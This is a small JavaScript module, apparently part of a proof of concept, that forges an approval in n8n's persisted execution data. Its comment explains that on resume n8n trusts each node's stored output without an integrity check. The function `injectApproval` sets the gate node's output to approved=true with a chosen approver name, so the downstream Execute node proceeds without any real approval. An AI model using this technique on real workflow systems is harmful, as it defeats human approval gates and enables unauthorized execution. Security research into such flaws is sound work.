/**
 * Forge the persisted gate output in the execution data.
 *
 * n8n restores resultData.runData on resume and feeds each node's persisted output to
 * its children with no integrity check. Setting the gate node's persisted output to
 * approved=true is therefore trusted by the downstream Execute node on resume.
 */
const { gateJson } = require('./workflow.cjs');

function injectApproval(store, approver) {
  const runData = store.load();
  const gate = gateJson(runData);
  gate.approved = true;
  gate.approver = approver;
  store.save(runData);
}

module.exports = { injectApproval };
